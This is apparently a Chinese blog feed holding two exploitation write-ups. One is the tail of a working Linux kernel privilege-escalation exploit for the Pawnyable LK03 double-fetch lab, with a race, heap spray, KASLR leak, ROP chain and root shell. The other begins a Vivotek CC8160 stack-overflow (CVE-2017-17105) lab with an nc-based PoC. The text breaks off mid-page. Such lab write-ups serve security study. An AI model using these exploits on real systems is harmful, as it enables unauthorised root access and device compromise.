<span class="token keyword">volatile</span><span class="token punctuation">(</span><span class="token string">"mov %0,cs;"</span><span class="token string">"mov %1,ss;"</span><span class="token string">"mov %2,rsp;"</span><span class="token string">"pushf;"</span><span class="token string">"pop %3;"</span>    <span class="token operator">:</span> <span class="token string">"=r"</span><span class="token punctuation">(</span>user_cs<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"=r"</span><span class="token punctuation">(</span>user_ss<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"=r"</span><span class="token punctuation">(</span>user_rsp<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"=r"</span><span class="token punctuation">(</span>user_rflags<span class="token punctuation">)</span> <span class="token operator">:</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[*] Success to saveStatus!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">errExit</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span> msg<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\033[1;31m[-] Error : %s\033[0m\n"</span><span class="token punctuation">,</span> msg<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">exit</span><span class="token punctuation">(</span>EXIT_FAILURE<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">getRootShell</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">getuid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"\033[1;31;37m[*] &lt;Successfully Get Root Privileges>\033[0m"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"\033[1;31m[-] &lt;Get Root Error>\033[0m"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">//</span><span class="token keyword">typedef</span> <span class="token keyword">struct</span><span class="token punctuation">&#123;</span><span class="token keyword">char</span> <span class="token operator">*</span>ptr<span class="token punctuation">;</span><span class="token class-name">size_t</span> len<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token class-name">request_t</span><span class="token punctuation">;</span><span class="token keyword">int</span> win<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">int</span> fd<span class="token punctuation">;</span><span class="token class-name">request_t</span> req<span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">dexter_read</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>buf<span class="token punctuation">,</span> <span class="token class-name">size_t</span> size<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>req<span class="token punctuation">.</span>ptr<span class="token operator">=</span>buf<span class="token punctuation">;</span>req<span class="token punctuation">.</span>len<span class="token operator">=</span>size<span class="token punctuation">;</span><span class="token function">ioctl</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> <span class="token number">0xdec50001</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>req<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">dexter_write</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>buf<span class="token punctuation">,</span> <span class="token class-name">size_t</span> size<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>req<span class="token punctuation">.</span>ptr<span class="token operator">=</span>buf<span class="token punctuation">;</span>req<span class="token punctuation">.</span>len<span class="token operator">=</span>size<span class="token punctuation">;</span><span class="token function">ioctl</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> <span class="token number">0xdec50002</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>req<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token function">race</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span>size<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span>win<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>req<span class="token punctuation">.</span>len<span class="token operator">=</span><span class="token punctuation">(</span><span class="token class-name">size_t</span><span class="token punctuation">)</span>size<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">compete_read</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>buf<span class="token punctuation">,</span> <span class="token class-name">size_t</span> size<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token class-name">pthread_t</span> compete_id<span class="token punctuation">;</span><span class="token function">pthread_create</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>compete_id<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> race<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">void</span><span class="token operator">*</span><span class="token punctuation">)</span>size<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span>win<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">dexter_read</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">size_t</span> leak<span class="token operator">=</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">size_t</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>buf<span class="token operator">+</span><span class="token number">0x20</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>leak<span class="token operator">&amp;</span><span class="token number">0xff00000000000000</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0xff00000000000000</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[*] compete_read Finished\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>win<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">break</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token function">pthread_join</span><span class="token punctuation">(</span>compete_id<span class="token punctuation">,</span><span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>win<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">compete_write</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>buf<span class="token punctuation">,</span> <span class="token class-name">size_t</span> size<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token class-name">pthread_t</span> compete_id<span class="token punctuation">;</span><span class="token function">pthread_create</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>compete_id<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> race<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">void</span><span class="token operator">*</span><span class="token punctuation">)</span>size<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span><span class="token number">0x10000</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">dexter_write</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">pthread_cancel</span><span class="token punctuation">(</span>compete_id<span class="token punctuation">)</span><span class="token punctuation">;</span>win<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>envp<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">saveStatus</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//spray</span><span class="token keyword">int</span> p<span class="token punctuation">[</span><span class="token number">200</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span><span class="token number">100</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>p<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/proc/self/stat"</span><span class="token punctuation">,</span> O_RDONLY<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[*] Spary 100 seq_operations"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>fd<span class="token operator">=</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/dev/dexter"</span><span class="token punctuation">,</span>O_RDWR<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>fd<span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[+] /dev/dexter Opened"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">100</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span><span class="token number">200</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>p<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/proc/self/stat"</span><span class="token punctuation">,</span> O_RDONLY<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[*] Spary 100 seq_operations"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//leak</span><span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">0x100</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token function">compete_read</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token number">0x100</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">size_t</span> seq_start<span class="token operator">=</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">size_t</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>buf<span class="token punctuation">[</span><span class="token number">0x20</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token class-name">size_t</span> koff<span class="token operator">=</span>seq_start<span class="token operator">-</span><span class="token number">0xffffffff81000000</span><span class="token operator">-</span><span class="token number">0x170f80</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[*] seq_start=>0x%lx\n"</span><span class="token punctuation">,</span> seq_start<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[*] koff=>0x%lx\n"</span><span class="token punctuation">,</span> koff<span class="token punctuation">)</span><span class="token punctuation">;</span>POP_RDI_RET<span class="token operator">+=</span>koff<span class="token punctuation">;</span>POP_RCX_RET<span class="token operator">+=</span>koff<span class="token punctuation">;</span>POP_RBX_RET<span class="token operator">+=</span>koff<span class="token punctuation">;</span>MOV_RDI_RAX_REP_MOVSQ_RET<span class="token operator">+=</span>koff<span class="token punctuation">;</span>ADD_RSP_0X140_P6_RET<span class="token operator">+=</span>koff<span class="token punctuation">;</span>prepare_kernel_cred<span class="token operator">+=</span>koff<span class="token punctuation">;</span>commit_creds<span class="token operator">+=</span>koff<span class="token punctuation">;</span>swapgs_restore_regs_and_return_to_usermode<span class="token operator">+=</span>koff<span class="token operator">+</span><span class="token number">18</span><span class="token punctuation">;</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">size_t</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>buf<span class="token punctuation">[</span><span class="token number">0x20</span><span class="token punctuation">]</span><span class="token operator">=</span>ADD_RSP_0X140_P6_RET<span class="token punctuation">;</span><span class="token function">compete_write</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token number">0x100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>tmp_fd<span class="token operator">=</span>p<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">__asm__</span><span class="token punctuation">(</span>        <span class="token string">"mov r15, POP_RDI_RET;"</span>        <span class="token string">"mov r14, 0;"</span>        <span class="token string">"mov r13, prepare_kernel_cred;"</span>        <span class="token string">"mov r12, POP_RCX_RET;"</span><span class="token string">"mov rbp, 0;"</span>        <span class="token string">"mov rbx, POP_RBX_RET;"</span><span class="token comment">//r11</span>        <span class="token string">"mov r10, MOV_RDI_RAX_REP_MOVSQ_RET;"</span>        <span class="token string">"mov r9,  commit_creds;"</span>        <span class="token string">"mov r8,  swapgs_restore_regs_and_return_to_usermode;"</span>        <span class="token string">"xor rax, rax;"</span>        <span class="token string">"mov rdx, 0x8;"</span>        <span class="token string">"mov rsi, rsp;"</span>        <span class="token string">"mov rdi, tmp_fd;"</span>        <span class="token string">"syscall;"</span>    <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">getRootShell</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">close</span><span class="token punctuation">(</span>fd<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/EXP_FILE/5e048596e128fae2bdbdc56eb630a8c4_MD5.jpeg"></p><h2 id="三-中间出现的问题"><a href="#三-中间出现的问题" class="headerlink" title="(三) 中间出现的问题"></a>(三) 中间出现的问题</h2><p>我一开始是这样触发ropchain的：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">   <span class="token function">__asm__</span><span class="token punctuation">(</span>       <span class="token string">"mov r15, POP_RDI_RET;"</span>       <span class="token string">"mov r14, 0;"</span>       <span class="token string">"mov r13, prepare_kernel_cred;"</span>       <span class="token string">"mov r12, POP_RCX_RET;"</span><span class="token string">"mov rbp, 0;"</span>       <span class="token string">"mov rbx, POP_RBX_RET;"</span><span class="token comment">//r11</span>       <span class="token string">"mov r10, MOV_RDI_RAX_REP_MOVSQ_RET;"</span>       <span class="token string">"mov r9,  commit_creds;"</span>       <span class="token string">"mov r8,  swapgs_restore_regs_and_return_to_usermode;"</span>   <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span><span class="token number">200</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">read</span><span class="token punctuation">(</span>p<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">"X1NRI"</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>结果一直段错误🤡，这是因为我们已经修改了rbp为一个非法值，后面再调用函数肯定会使用rbp从而出现异常</p><p>正确的做法是进行系统调用触发ropchain，避免使用rbp：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">  <span class="token function">__asm__</span><span class="token punctuation">(</span>      <span class="token string">"mov r15, POP_RDI_RET;"</span>      <span class="token string">"mov r14, 0;"</span>      <span class="token string">"mov r13, prepare_kernel_cred;"</span>      <span class="token string">"mov r12, POP_RCX_RET;"</span><span class="token string">"mov rbp, 0;"</span>      <span class="token string">"mov rbx, POP_RBX_RET;"</span><span class="token comment">//r11</span>      <span class="token string">"mov r10, MOV_RDI_RAX_REP_MOVSQ_RET;"</span>      <span class="token string">"mov r9,  commit_creds;"</span>      <span class="token string">"mov r8,  swapgs_restore_regs_and_return_to_usermode;"</span>      <span class="token string">"xor rax, rax;"</span>      <span class="token string">"mov rdx, 0x8;"</span>      <span class="token string">"mov rsi, rsp;"</span>      <span class="token string">"mov rdi, tmp_fd;"</span>      <span class="token string">"syscall;"</span>  <span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>这篇的坑我还真遇到不少…哭，耗了好长时间，还是太菜了</p></blockquote><blockquote><p>附件：<a href="https://pawnyable.cafe/linux-kernel/LK03/distfiles/LK03.tar.gz">LK03.tar.gz</a><br>参考文章：<a href="https://blog.wohin.me/posts/pawnyable-0302/">Linux Kernel PWN | 040302 Pawnyable之双取 (wohin.me)</a><br><a href="https://pawnyable-cafe.translate.goog/linux-kernel/LK03/double_fetch.html?_x_tr_sl=auto&_x_tr_tl=zh-CN&_x_tr_hl=zh-CN&_x_tr_pto=wapp">双取 | 可典当！ (pawnyable-cafe.translate.goog)</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Linux Kernel Mode </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pawnyable </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vivotek CC8160 栈溢出漏洞</title>
      <link href="/2024/02/12/Vivotek%20CC8160%20%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%20(CVE-2017-17105)/"/>
      <url>/2024/02/12/Vivotek%20CC8160%20%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%20(CVE-2017-17105)/</url>
      
        <content type="html"><![CDATA[<blockquote><p>Vivotek是一家知名的家庭摄像头企业，其旗下的一款高清摄像头Vivotek CC8160，在2017年被发现存在一个远程命令执行的漏洞。这个漏洞是由于程序在处理POST请求中的Content-Length字段时，没有对长度进行检测，导致用户可以输入任意长度的字符串造成栈溢出。<a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-17105">CVE - CVE-2017-17105 (mitre.org)</a></p></blockquote><h1 id="一、环境搭建"><a href="#一、环境搭建" class="headerlink" title="一、环境搭建"></a>一、环境搭建</h1><blockquote><p><a href="https://github.com/Vu1nT0tal/IoT-vulhub/tree/master/VIVOTEK/remote_stack_overflow">IoT-vulhub&#x2F;VIVOTEK&#x2F;remote_stack_overflow at master · Vu1nT0tal&#x2F;IoT-vulhub (github.com)</a></p></blockquote><h2 id="IoT-vulhub基础环境"><a href="#IoT-vulhub基础环境" class="headerlink" title="IoT-vulhub基础环境"></a>IoT-vulhub基础环境</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 下载本项目</span><span class="token function">wget</span> https://github.com/VulnTotal-Team/IoT-vulhub/archive/master.zip <span class="token parameter variable">-O</span> iot-vulhub-master.zip<span class="token function">unzip</span> iot-vulhub-master.zip <span class="token operator">&amp;&amp;</span> <span class="token builtin class-name">cd</span> iot-vulhub-master<span class="token comment"># 构建 ubuntu1604 基础镜像</span><span class="token builtin class-name">cd</span> baseImage/ubuntu1604 <span class="token operator">&amp;&amp;</span> <span class="token function">docker</span> build <span class="token parameter variable">-t</span> firmianay/ubuntu1604 <span class="token builtin class-name">.</span><span class="token comment"># 构建 binwalk 容器，方便使用</span><span class="token builtin class-name">cd</span> baseImage/binwalk <span class="token operator">&amp;&amp;</span> <span class="token function">docker</span> build <span class="token parameter variable">-t</span> firmianay/binwalk <span class="token builtin class-name">.</span><span class="token comment"># 搭建qemu user的环境</span><span class="token builtin class-name">cd</span> baseImage/qemu-user-static<span class="token function">sudo</span> <span class="token function">docker</span> build <span class="token parameter variable">-t</span> firmianay/qemu-user-static <span class="token builtin class-name">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="漏洞环境搭建"><a href="#漏洞环境搭建" class="headerlink" title="漏洞环境搭建"></a>漏洞环境搭建</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> VIVOTEK/remote_stack_overflow<span class="token comment"># 解压固件</span>binwalk <span class="token parameter variable">-Mer</span> <span class="token string">"./firmware/CC8160-VVTK-0100d.flash.pkg"</span><span class="token comment"># 搭建qemu system的arm环境</span><span class="token builtin class-name">cd</span> baseImage/qemu-system/armel/images <span class="token operator">&amp;&amp;</span> <span class="token function">bash</span> ./download.sh<span class="token builtin class-name">cd</span> <span class="token punctuation">..</span>/<span class="token function">sudo</span> <span class="token function">docker</span> build <span class="token parameter variable">-t</span> firmianay/qemu-system:armel <span class="token builtin class-name">.</span><span class="token function">bash</span> ./init_env.sh arm <span class="token comment">#(有三种参数: arm/mips/mipsel)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>报错1：在执行<code>system-emu/dockerfile</code>和<code>user-emu/dockerfile</code>时会报错：<code>COPY ./firmware/_*/_31* /root/firmware</code> 会执行失败。<br>将其改为 <code>COPY ./firmware/_CC8160-VVTK-0100d.flash.pkg.extracted/_31.extracted /root/firmware</code>，这是因为在新版docker中，会对文件名做检测</li></ul><h3 id="用户模拟"><a href="#用户模拟" class="headerlink" title="用户模拟"></a>用户模拟</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 构建镜像</span><span class="token function">sudo</span> <span class="token function">docker-compose</span> <span class="token parameter variable">-f</span> docker-compose-user.yml build<span class="token comment"># 启动容器</span><span class="token function">sudo</span> <span class="token function">docker-compose</span> <span class="token parameter variable">-f</span> docker-compose-user.yml up<span class="token comment"># 关闭容器</span><span class="token function">sudo</span> <span class="token function">docker-compose</span> <span class="token parameter variable">-f</span> docker-compose-user.yml down<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="系统模拟"><a href="#系统模拟" class="headerlink" title="系统模拟"></a>系统模拟</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 构建镜像</span><span class="token function">sudo</span> <span class="token function">docker-compose</span> <span class="token parameter variable">-f</span> docker-compose-system.yml build<span class="token comment"># 启动容器</span><span class="token function">sudo</span> <span class="token function">docker-compose</span> <span class="token parameter variable">-f</span> docker-compose-system.yml up<span class="token comment"># 关闭容器</span><span class="token function">sudo</span> <span class="token function">docker-compose</span> <span class="token parameter variable">-f</span> docker-compose-system.yml down<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="进入用户机"><a href="#进入用户机" class="headerlink" title="进入用户机"></a>进入用户机</h3><p>打开一个新终端</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 进入攻击机环境</span><span class="token function">sudo</span> <span class="token function">docker</span> <span class="token builtin class-name">exec</span> <span class="token parameter variable">-it</span> vivotek-system /bin/bash<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="进入服务器"><a href="#进入服务器" class="headerlink" title="进入服务器"></a>进入服务器</h3><p>打开一个新终端</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">docker</span> <span class="token builtin class-name">exec</span> <span class="token parameter variable">-it</span> vivotek-system /bin/bash<span class="token comment"># 进入靶机环境，密码root</span><span class="token function">ssh</span> root@192.168.2.2<span class="token comment">#以指定目录为根弹出一个shell</span><span class="token function">chroot</span> ./squashfs-root/ <span class="token function">sh</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>服务地址：192.168.2.2:80</p><h1 id="二、漏洞分析"><a href="#二、漏洞分析" class="headerlink" title="二、漏洞分析"></a>二、漏洞分析</h1><h2 id="解压固件"><a href="#解压固件" class="headerlink" title="解压固件"></a>解压固件</h2><ol><li>解压固件(_CC8160-VVTK-0100d.flash.pkg.extracted)</li><li>进入文件夹，解压文件系统(rootfs.img)，漏洞程序位置为<code>/usr/sbin/httpd</code>。ARM32架构，动态链接，开了NX，且去除了符号表…</li></ol><h2 id="一点调试问题"><a href="#一点调试问题" class="headerlink" title="一点调试问题"></a>一点调试问题</h2><p>不过在这之前，先要解决调试的问题—-用户机gdb的gef用不了，调试很不方便，我选择使用<code>docker cp</code>把pwndbg的deb包复制到镜像里安装，再把目录下的.gdbinit删掉。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">wget</span> <span class="token punctuation">[</span>https://github.com/pwndbg/pwndbg/releases/download/2023.07.17-pkgs/pwndbg_2023.07.17_amd64.deb<span class="token punctuation">]</span><span class="token punctuation">(</span>https://github.com/pwndbg/pwndbg/releases/download/2023.07.17-pkgs/pwndbg_2023.07.17_amd64.deb<span class="token punctuation">)</span><span class="token function">sudo</span> <span class="token function">docker</span> <span class="token function">cp</span> pwndbg_2023.07.17_amd64.deb dockerid:/root/<span class="token function">sudo</span> dpkg <span class="token parameter variable">-i</span> pwndbg_2023.07.17_amd64.deb <span class="token comment">#安装</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/EXP_FILE/3901a6e6e671cd631f289154208646c0_MD5.jpeg"></p><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><p>原作者提供了POC：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span><span class="token builtin class-name">echo</span> <span class="token parameter variable">-en</span> <span class="token string">"POST /cgi-bin/admin/upgrade.cgi<span class="token entity" title="\r">\r</span><span class="token entity" title="\n">\n</span>HTTP/1.0<span class="token entity" title="\n">\n</span>Content-Length:AAAAAAAAAAAAAAAAAAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIXXXX<span class="token entity" title="\n">\n</span><span class="token entity" title="\r">\r</span><span class="token entity" title="\n">\n</span><span class="token entity" title="\r">\r</span><span class="token entity" title="\n">\n</span>"</span>  <span class="token operator">|</span> <span class="token function">nc</span> <span class="token parameter variable">-v</span> <span class="token number">192.168</span>.2.2 <span class="token number">80</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>通过对Content-Length的交叉引用找到漏洞点：<br><img src="/EXP_FILE/c0d50f7242811268f5c0654e3673d52f_MD5.jpeg"><br>来试下POC，远程调试进程<br><img 